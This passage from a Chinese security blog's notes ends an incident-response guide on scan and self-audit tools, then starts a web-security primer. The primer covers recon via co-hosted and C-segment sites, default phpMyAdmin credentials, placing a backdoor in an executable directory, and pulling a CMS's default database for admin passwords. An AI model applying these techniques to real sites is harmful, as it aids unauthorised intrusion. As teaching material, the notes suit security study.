7.14、8种系统启动项后门检测</span><br><span class="line">8、账户类安全排查</span><br><span class="line">  8.1、root权限账户检测</span><br><span class="line">  8.2、空口令账户检测</span><br><span class="line">  8.3、sudoers文件用户权限检测</span><br><span class="line">  8.4、查看各账户下登录公钥</span><br><span class="line">  8.5、账户密码文件权限检测</span><br><span class="line">9、日志类安全分析</span><br><span class="line">  9.1、secure登陆日志</span><br><span class="line">  9.2、wtmp登陆日志</span><br><span class="line">  9.3、utmp登陆日志</span><br><span class="line">  9.4、lastlog登陆日志</span><br><span class="line">10、安全配置类分析</span><br><span class="line">  10.1、DNS配置检测</span><br><span class="line">  10.2、Iptables防火墙配置检测</span><br><span class="line">  10.3、hosts配置检测</span><br><span class="line">11、Rootkit分析</span><br><span class="line">  11.1、检查已知rootkit文件类特征</span><br><span class="line">  11.2、检查已知rootkit LKM类特征</span><br><span class="line">  11.3、检查已知恶意软件类特征检测</span><br><span class="line">12.WebShell类文件扫描</span><br><span class="line">  12.1、WebShell类文件扫描</span><br></pre></td></tr></table></figure><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h4><blockquote><p>系统：CentOS (6、7) + python (2.x、3.x)</p><p>权限：root权限启动</p><p>执行时间：默认安全扫描大概执行时间为4～6分钟，完全扫描在1～2小时之间，程序执行时间的长度由检测文件的多少决定，有可能会存在较长的时间，请耐心等待</p><p>兼容性：目前程序只针对Centos进行开发测试，其他系统并未做兼容性，检测结果未知</p></blockquote><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/grayddq/GScan.git</span><br><span class="line">cd GScan</span><br><span class="line">python GScan.py -h</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210210627305.png" alt="image-20221021062755991"></p></blockquote><h1 id="自查漏洞模拟渗透测试寻找攻击源（漏洞、口令检索）"><a href="#自查漏洞模拟渗透测试寻找攻击源（漏洞、口令检索）" class="headerlink" title="自查漏洞模拟渗透测试寻找攻击源（漏洞、口令检索）"></a>自查漏洞模拟渗透测试寻找攻击源（漏洞、口令检索）</h1><blockquote><p>模拟渗透呢主要针对以下两种情况：</p><ul><li>日志被删或没利用价值</li><li>没有思路进行分析且可以采用模拟渗透</li></ul></blockquote><h3 id="系统漏洞自查（win、linux）"><a href="#系统漏洞自查（win、linux）" class="headerlink" title="系统漏洞自查（win、linux）"></a>系统漏洞自查（win、linux）</h3><blockquote><p>主要工具为<code>WindowsvulnScan</code>、<code>linux-exploit-suggester</code>，也可以辅以<code>Nessus</code>扫系统漏洞</p></blockquote><ol><li>windows自查</li></ol><blockquote><ul><li><a href="https://github.com/chroblert/WindowsVulnScan">GitHub - chroblert&#x2F;WindowsVulnScan</a></li></ul><blockquote><p><strong>功能：</strong></p><ul><li>查找主机上具有的CVE</li><li>查找具有公开EXP的CVE</li><li>主要就是自查Windows的漏洞，具体用法看GitHub</li></ul></blockquote><p>如果出现报错，将KB.json切换为utf-8模式</p><p>查出漏洞之后，可以根据给出的漏洞补丁去Google对应的漏洞，查看本机<strong>是否符合该漏洞的条件</strong>，并且<strong>打补丁</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:\Myproject\venv\Scripts\python.exe cve-check.py -C -f KB.json</span><br></pre></td></tr></table></figure></blockquote><ol start="2"><li>linux自查</li></ol><blockquote><ul><li><a href="https://github.com/mzet-/linux-exploit-suggester">GitHub - mzet-&#x2F;linux-exploit-suggester: Linux privilege escalation auditing tool</a></li></ul><blockquote><p>LES工具旨在帮助检测给定的基于Linux内核&#x2F;基于Linux的计算机的安全缺陷。</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure></blockquote><h3 id="服务漏洞自查"><a href="#服务漏洞自查" class="headerlink" title="服务漏洞自查"></a>服务漏洞自查</h3><blockquote><p>非系统的漏洞</p><p>先收集信息康康有哪些服务，然后配合工具<code>searchsploit</code>，进行漏洞自查</p><p>如果测出漏洞，hacker十有八九就是从这些地方进入的了~~</p></blockquote><ol><li>Windows</li></ol><blockquote><p>查看系统的服务或者软件等等</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-class</span> Win32_Product</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220649823.png" alt="image-20221022064922484" style="zoom:50%;" /><ol start="2"><li>Linux 地址</li></ol><blockquote><p><a href="https://github.com/rebootuser/LinEnum">GitHub - rebootuser&#x2F;LinEnum: Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p><p>脚本化本地 Linux 枚举和权限提升检查</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure><ol start="3"><li>根据检索出来的服务进行漏洞扫描 主要使用<code>searchsploit</code>，比如weblogic</li></ol><blockquote><p><a href="https://github.com/offensive-security/exploitdb">offensive-security&#x2F;exploitdb: The official Exploit Database repository (github.com)</a></p><p>msf上面也有这个漏洞库，会更新最新的漏洞库</p><p>前面查找出服务和版本信息后，在这个里面search 服务的名字，然后根据版本判断是否存在漏洞</p><p>改根据会给出漏洞的poc或者exp</p><p>拿到poc后再去测试即可</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">到项目目录</span></span><br><span class="line">./searchsploit weblogic</span><br></pre></td></tr></table></figure><blockquote><p>其中查询的漏洞exploitdb下面的目录分别为dos、local（本地提权）、remote(代码执行）、webapps，目录分类也是有讲究的</p></blockquote><h3 id="检查弱口令"><a href="#检查弱口令" class="headerlink" title="检查弱口令"></a>检查弱口令</h3><blockquote><p>安全设备、弱口令扫描工具、问客户都可以得知弱口令情况</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.cnblogs.com/zhengna/p/15393853.html">72：内网安全-域横向CS&amp;MSF联动及应急响应初识</a></li><li><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/">大佬Windows应急响应笔记</a></li><li>应急响应大合集：<a href="https://xz.aliyun.com/t/485">https://xz.aliyun.com/t/485</a> </li><li><a href="https://websec.readthedocs.io/zh/latest/defense/emergency.html">8.14. 应急响应 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)</a></li></ul></blockquote><h1 id="资源-amp-工具"><a href="#资源-amp-工具" class="headerlink" title="资源&amp;工具"></a>资源&amp;工具</h1><blockquote><p><a href="https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg">https://pan.baidu.com/s/1tQS1mUelmEh3I68AL7yXGg</a> 提取码:: xiao 应急响应资料工具-小迪安全</p><p>最全Windows安全工具锦集<a href="https://www.secpulse.com/archives/114019.html">https://www.secpulse.com/archives/114019.html</a> </p><p>windows微软推出的工具套件：<a href="https://docs.microsoft.com/en-us/sysinternals/">https://docs.microsoft.com/en-us/sysinternals/</a></p></blockquote><h2 id="在线病毒扫描网站"><a href="#在线病毒扫描网站" class="headerlink" title="在线病毒扫描网站"></a>在线病毒扫描网站</h2><blockquote><p><a href="http://www.virscan.org/">http://www.virscan.org</a> &#x2F;&#x2F;多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎</p><p><a href="https://habo.qq.com/">https://habo.qq.com</a> &#x2F;&#x2F;腾讯哈勃分析系统</p><p><a href="https://virusscan.jotti.org/">https://virusscan.jotti.org</a> &#x2F;&#x2F;Jotti恶意软件扫描系统</p><p><a href="http://www.scanvir.com/">http://www.scanvir.com</a> &#x2F;&#x2F;针对计算机病毒、手机病毒、可疑文件等进行检测分析</p></blockquote><h2 id="病毒动态"><a href="#病毒动态" class="headerlink" title="病毒动态"></a>病毒动态</h2><blockquote><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn/">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn/">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net/">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p></blockquote><h2 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h2><blockquote><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a> （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free%EF%BC%88%E6%8E%A8%E8%8D%90%E7%90%86%E7%94%B1%EF%BC%9A%E6%89%AB%E6%8F%8F%E5%BF%AB%E3%80%81%E4%B8%80%E6%AC%A1%E4%B8%8B%E8%BD%BD%E5%8F%AA%E8%83%BD%E7%94%A81%E5%91%A8%EF%BC%8C%E6%9B%B4%E6%96%B0%E7%97%85%E6%AF%92%E5%BA%93%EF%BC%89">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p></blockquote><h2 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h2><blockquote><p>PCHunter：<a href="http://www.xuetr.com/">http://www.xuetr.com</a></p><p>获取进程监控，蓝色表示非系统进程</p><p>火绒剑：<a href="https://www.huorong.cn/">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p></blockquote><h2 id="自动化应急和取证工具箱ir-rescue"><a href="#自动化应急和取证工具箱ir-rescue" class="headerlink" title="自动化应急和取证工具箱ir-rescue"></a>自动化应急和取证工具箱<code>ir-rescue</code></h2><blockquote><p>应急响应取证工具箱（略大）:</p><p>一个 Windows 批处理脚本和一个 Unix Bash 脚本，用于在事件响应期间全面收集主机取证数据。</p><p>地址：<a href="https://github.com/diogo-fernan/ir-rescue">diogo-fernan&#x2F;ir-rescue: A Windows Batch script and a Unix Bash script to comprehensively collect host forensic data during incident response. (github.com)</a></p></blockquote><blockquote><p>Windows只要运行bat文件，这里面有很多工具，就是一个工具箱，里面就是一些应急和取证的工具</p><p>然后点击bat文件就会帮你下载常见的工具</p><p>主要是用于打造自己的工具箱</p><p>在客户那边工作的时候直接一键下载</p><p>需要什么工具可以修改bat文件去下载</p><p>具体参考GitHub文档</p><p>自己常见的软件可以放进去，并保持工具的最新版</p></blockquote><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210190126741.png" alt="img"></p><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 蓝队 </category>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Web安全基础知识</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一些简单的基础知识</p><h1 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h1><h3 id="常见的脚本语言类型有哪些？"><a href="#常见的脚本语言类型有哪些？" class="headerlink" title="常见的脚本语言类型有哪些？"></a>常见的脚本语言类型有哪些？</h3><p><code>asp php aspx jsp javaweb pl py cgi</code> 等</p><blockquote><p>cgi一般国外用，jsp，python，php一般用的多，aspx还有，但不多</p><p>php适合小中型网站，java适合中大型网站</p></blockquote><h3 id="不同脚本类型与安全漏洞的关系？"><a href="#不同脚本类型与安全漏洞的关系？" class="headerlink" title="不同脚本类型与安全漏洞的关系？"></a>不同脚本类型与安全漏洞的关系？</h3><blockquote><ul><li>不同脚本可能爆发漏洞的可能性有所不同</li><li>不同脚本漏洞的存在点可能不同，因为不同语言的适用范围不同</li></ul></blockquote><h1 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h1><h3 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h3><blockquote><p>原则是一个网站，但区别在于目录下的相差 例：<code>c:/www/root</code>  、<code>c:/www/root/bbs</code></p><p>但两个网站是两套程序（在不同目录下），一个网站源码出现漏洞，另一个网站也会遭殃，就等于给与了两套漏洞方案</p><p>可通过目录扫描工具可以查询，或者手动去找去点</p><p>例子：</p><blockquote><p><code>sti.blcu.edu.cn</code>和<code>sti.blcu.edu.cn/bbs</code></p></blockquote></blockquote><h3 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h3><blockquote><p>在同一台服务器上，以端口来把网站进行分开，一个网站出现安全问题，也会导致另一个网站出现安全问题</p><p>进行端口扫描，或者在网上搜索信息</p></blockquote><h3 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h3><blockquote><p>这两个网站有可能不在同一个服务器上，子域名在解析的时候被设置到映射为其他IP，可能和主站不同</p><p>而且可能使用的是不同类型的程序源码搭建的 </p><p>参考：如果IP地址不同，有可能两个站点不在同一个服务器上</p></blockquote><h3 id="搭建习惯-类似域名站点"><a href="#搭建习惯-类似域名站点" class="headerlink" title="搭建习惯-类似域名站点"></a>搭建习惯-类似域名站点</h3><blockquote><p>出自于同一个公司的网站</p><blockquote><p>如：<code>www.jmlsd.com</code>和<code>jmlsd.cn</code></p></blockquote><p>基于域名后缀的更改</p><p>基于域名的更改</p></blockquote><h3 id="搭建习惯-旁注，c段站点"><a href="#搭建习惯-旁注，c段站点" class="headerlink" title="搭建习惯-旁注，c段站点"></a>搭建习惯-旁注，c段站点</h3><blockquote><p>查询网站：<a href="https://www.webscan.cc/">同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan</a></p></blockquote><h4 id="旁注："><a href="#旁注：" class="headerlink" title="旁注："></a>旁注：</h4><blockquote><p>同服务器不同站点。两个网站或者多个网站放在同一个服务器上，其中一个网站是你的目标。</p><p>前提条件：有多个站点，但只有一台服务器</p><p>192.168.1.100</p><blockquote><p><a href="http://www.a.com(目标)/">www.a.com（目标）</a></p><p><a href="http://www.b.com/">www.b.com</a></p><p>……..</p></blockquote></blockquote><h4 id="C段："><a href="#C段：" class="headerlink" title="C段："></a>C段：</h4><blockquote><p>同网段不同服务器不同站点。网站有一个或多个站点，通过服务器IP地址的网段来进行测试。</p><p>192.168.1.100：<a href="http://www.a.com(目标)/">www.a.com（目标）</a></p><p>192.168.1.101：<a href="http://www.a.com/">www.a.com</a></p><p>通过查询网段1-254，去获取101网段服务器权限，在通过服务器同一个网段目标主机来实施内网安全的测试方法，来获取指定网站服务器的权限。</p><p>C端服务器中只要有一台被拿下，可以内网横向去另一台内网服务器</p></blockquote><h3 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h3><p>一体化搭建软件：<code>宝塔、PHPSTUDY、WMAP、INMAP</code></p><p>如何甄别这些软件，可以通过<strong>server头</strong>来查看，这些要靠积累</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210260225648.png" alt="image-20221026022528275" style="zoom:50%;" /><p>常规的搭建软件都有常规的数据库的默认账号密码，如果搭建者不去更改的话，就能成为突破思路。</p><p>这些常见的搭建软件可能存在版本漏洞，我们有时候就可以从这些软件入手</p><p>例：</p><p><code>Apache/2.4.41(win32)OpenSSL/1.1.1c mod_fcgid/2.3.9a</code>  宝塔 (信息很全基本上是搭建软件)</p><p><code>Apache/2.4.41(win32)OpenSSL/1.0.2j PHP/5.4.45</code>  默认的安全设置(<code>/phpmyadmin</code> 默认账户和密码：root&#x2F;root)</p><blockquote><p>确认是否是宝塔的话，访问域名的<code>8888</code>端口，宝塔在此端口有个登录面板</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210260222551.png" alt="image-20221026022233146" style="zoom: 33%;" /></blockquote><p>直接拿着上面的<code>Apache/2.4.41(win32)OpenSSL/1.0.2j PHP/5.4.45</code>头部去sodan搜：</p><p>能搜出很多类似的server头部的网站，这些网站基本上都是同一搭建网站</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210260231002.png" alt="image-20221026023110593" style="zoom: 33%;" /><h1 id="搭建网站平台安全拓展"><a href="#搭建网站平台安全拓展" class="headerlink" title="搭建网站平台安全拓展"></a>搭建网站平台安全拓展</h1><blockquote><p>即中间件</p></blockquote><h3 id="常见中间件脚本启用"><a href="#常见中间件脚本启用" class="headerlink" title="常见中间件脚本启用"></a>常见中间件脚本启用</h3><p>ASP,PHP,ASPX,JSP,PY,JAVAWEB等环境</p><h4 id="以IIS为例"><a href="#以IIS为例" class="headerlink" title="以IIS为例"></a>以IIS为例</h4><p>默认aspx（可以看到asp.net已启用），在拓展中可以启用asp</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210170504059.png" alt="image-20221017050443697" style="zoom:50%;" /><h3 id="域名IP目录解析安全问题"><a href="#域名IP目录解析安全问题" class="headerlink" title="域名IP目录解析安全问题"></a>域名IP目录解析安全问题</h3><p>IP地址访问可以发现更多的信息同时经常能找到程序源码备份文件和敏感信息，而域名访问只能发现一个文件夹下的所有文件。网站搭建的时候支持IP访问和域名访问，域名访问的时候一般只会指向某个目录，IP访问的时候指向的是根目录。</p><h3 id="常见文件后缀解析的原理"><a href="#常见文件后缀解析的原理" class="headerlink" title="常见文件后缀解析的原理"></a>常见文件后缀解析的原理</h3><p>可以在设置中指定后缀名对应某个文件去解析改该后缀名的文件，访问网站出现遇到不能解析的文件就是中间件可能默认或者添加某些设置导致解析时出现问题</p><p>比如说图中asp就是交给asp.dll来解析~可以看到cer和cdx后缀的文件也是这样解析的</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180116065.png" alt="image-20221018011628825" style="zoom: 50%;" /><h3 id="常见安全测试中的安全防护"><a href="#常见安全测试中的安全防护" class="headerlink" title="常见安全测试中的安全防护"></a>常见安全测试中的安全防护</h3><p>学校内网和企业内外会出现。会限制外部人员访问内部的网站，限制IP地址，规范访问者的权限。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180117165.png" alt="image-20221018011711929" style="zoom:50%;" /><p>身份验证和访问控制，基于用户的限制</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180117941.png" alt="image-20221018011726675" style="zoom:50%;" /><p>当取消匿名访问的时候：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210170529124.png" alt="image-20221017052917939" style="zoom:50%;" /><p>我们访问网站都是以计算机上面的访客权限使用，也就是匿名用户</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210170538455.png" alt="image-20221017053822278" style="zoom:50%;" /><p>限制IP地址的访问，授权访问-只允许指定IP地址可以访问。 拒绝访问-指定IP地址拒绝访问。（即firewall）</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180117735.png" alt="image-20221018011751488" style="zoom:50%;" /><h3 id="webshell与用户及文件权限"><a href="#webshell与用户及文件权限" class="headerlink" title="webshell与用户及文件权限"></a>webshell与用户及文件权限</h3><p>文件夹设置相关权限，禁止来宾用户的权限，导致连接的后门看不到任何东西，它属于防护技巧，同时也是安全测试里经常碰到的问题，该来宾用户对应的就是前面的匿名用户</p><p>一般在该web目录下都是拒绝来宾用户对该文件夹文件进行写入</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180118217.png" alt="image-20221018011812951" style="zoom:50%;" /><p>IIS设置执行权限，当没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180118094.png" alt="image-20221018011833819" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210170542116.png" alt="image-20221017054240969" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180118558.png" alt="image-20221018011850324" style="zoom:50%;" /><h4 id="绕过思路："><a href="#绕过思路：" class="headerlink" title="绕过思路："></a><strong>绕过思路：</strong></h4><p>将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面。网站不可能全不能执行的，不然就GG</p><h3 id="基于中间件的简要识别"><a href="#基于中间件的简要识别" class="headerlink" title="基于中间件的简要识别"></a>基于中间件的简要识别</h3><p>通过抓取数据包的返回结果，查询搭建平台信息，一般在返回包中都能找到</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180119103.png" alt="image-20221018011905850" style="zoom: 50%;" /><h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><blockquote><p>webshell，rootkit，远控木马等等，后门一般和免杀一起，学到再讲</p><p>具体的去看权限维持</p></blockquote><h3 id="什么是后门？"><a href="#什么是后门？" class="headerlink" title="什么是后门？"></a>什么是后门？</h3><ul><li>通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。</li><li>在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。</li></ul><h3 id="后门在安全测试中的实际意义？"><a href="#后门在安全测试中的实际意义？" class="headerlink" title="后门在安全测试中的实际意义？"></a>后门在安全测试中的实际意义？</h3><ul><li>可以更方便的链接到主机</li><li>在获取到玩主机权限的时候，后门可以充当命令控制台的角色</li></ul><h3 id="后门注意事项"><a href="#后门注意事项" class="headerlink" title="后门注意事项"></a>后门注意事项</h3><ul><li>后门是否给予执行权限</li><li>后门是否给予操作目录或文件权限</li><li>后门是否给予其他用户权限</li></ul><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="WEB-的组成架构模型？"><a href="#WEB-的组成架构模型？" class="headerlink" title="WEB 的组成架构模型？"></a>WEB 的组成架构模型？</h3><ul><li>网站源码：分脚本类型，分应用方向</li><li>操作系统：windows linux</li><li>中间件（搭建平台）：apache iis tomcat nginx 等</li><li>数据库：access mysql mssql oracle sybase db2 postsql 等</li></ul><h3 id="为什么要从-WEB-层面为主为首？为什么直接攻击服务器"><a href="#为什么要从-WEB-层面为主为首？为什么直接攻击服务器" class="headerlink" title="为什么要从 WEB 层面为主为首？为什么直接攻击服务器"></a>为什么要从 WEB 层面为主为首？为什么直接攻击服务器</h3><ul><li>web使用的比较广</li><li>web网站了漏洞相对较多</li><li>web 作为跳板深入到其他资源相对容易</li></ul><h3 id="WEB-相关安全漏洞"><a href="#WEB-相关安全漏洞" class="headerlink" title="WEB 相关安全漏洞"></a>WEB 相关安全漏洞</h3><ul><li><p>WEB 源码类对应漏洞：SQL 注入，文件上传，XSS，代码、命令执行，变量覆盖，逻辑漏洞，反序列化等</p></li><li><p>WEB 中间件对应漏洞：未授权访问，变量覆盖…</p></li><li><p>WEB 数据库对应漏洞：弱口令，权限提升…</p></li><li><p>WEB 系统层对应漏洞：提权，远程代码执行</p></li><li><p>其他第三方软件版本漏洞</p></li><li><p>APP 或 PC 应用结合类，当web网站找不到入口的时候，可以从app入手，涉及到逆向</p><p>某些app和web实际上是用一个模板开发，为了省事，</p><p>有的web和app二次开发，不同的漏洞</p><p>但这些不同的端，总是会有联系的，要注意细节</p></li></ul><h1 id="WEB-源码拓展"><a href="#WEB-源码拓展" class="headerlink" title="WEB 源码拓展"></a>WEB 源码拓展</h1><blockquote><p>Web源码在安全测试中是非常重要的信息来源，可以用来<strong>代码审计</strong>漏洞也可以用来做信息突破口，其中Web源码有很多技术需要简明分析。比如：获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180119386.png" alt="image-20221018011927171" style="zoom:50%;" /></blockquote><h3 id="关于-WEB-源码目录结构"><a href="#关于-WEB-源码目录结构" class="headerlink" title="关于 WEB 源码目录结构"></a>关于 WEB 源码目录结构</h3><p>数据库配置文件，后台目录，模板目录，数据库目录等</p><p>index.php 根据文件后缀判定</p><p>admin 网站后台路径</p><p>data 数据相关目录</p><p>install 安装目录</p><p>member 会员目录</p><p>template 模板目录(和网站相关的整体架构)</p><p>data &#x3D;&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面<strong>涉及到的管理员的账号密码</strong>。</p><h3 id="关于-WEB-源码脚本类型"><a href="#关于-WEB-源码脚本类型" class="headerlink" title="关于 WEB 源码脚本类型"></a>关于 WEB 源码脚本类型</h3><p>ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题</p><blockquote><p>该大佬文档中讲述了各种脚本语言机器常见安全问题</p><p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p></blockquote><h3 id="关于-WEB-源码应用分类"><a href="#关于-WEB-源码应用分类" class="headerlink" title="关于 WEB 源码应用分类"></a>关于 WEB 源码应用分类</h3><p>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p><p>开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</p><p>拿到对方的源码或者判断这个网站的应用类型之后应该侧重在哪些漏洞上做文章</p><h3 id="关于-WEB-源码其他说明"><a href="#关于-WEB-源码其他说明" class="headerlink" title="关于 WEB 源码其他说明"></a>关于 WEB 源码其他说明</h3><p>如果对方网站采用的是框架开发的话那么你面对的就是寻找<strong>框架的漏洞</strong>，如果是非框架的话寻找的漏洞针对的是<strong>代码写出来的漏洞</strong></p><p>CMS识别：判定一个网站是用什么程序搭建的</p><p>开源：去网上找寻漏洞文章。内部：常规的渗透测试，用扫描工具去判断。</p><p>关于源码的<strong>获取途径</strong>：搜索，闲鱼淘宝，第三方源码站，各种行业对应。灰色源码可以在菜鸟源码上找到</p><h3 id="挖掘漏洞"><a href="#挖掘漏洞" class="headerlink" title="挖掘漏洞"></a>挖掘漏洞</h3><blockquote><p>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p></blockquote><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><h4 id="ASP-PHP等源码下安全测试"><a href="#ASP-PHP等源码下安全测试" class="headerlink" title="ASP,PHP等源码下安全测试"></a>ASP,PHP等源码下安全测试</h4><h5 id="平台识别-某CMS无漏洞-默认数据库"><a href="#平台识别-某CMS无漏洞-默认数据库" class="headerlink" title="平台识别-某CMS无漏洞-默认数据库"></a>平台识别-某CMS无漏洞-默认数据库</h5><p>访问网站，随意点开，查看后缀，判定程序</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180119029.png" alt="image-20221018011947684" style="zoom:50%;" /><p>网站底部关键词XYCMS</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180120022.png" alt="image-20221018012018795" style="zoom:50%;" /><p>搜索XYCMS，下载源码，分析</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180120235.png" alt="image-20221018012038988" style="zoom:50%;" /><p>下载打开之后找寻关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)，或者其他敏感文件</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210180120549.png" alt="image-20221018012056330" style="zoom:50%;" /><p>文件里存有管理员的账号密码</p><img 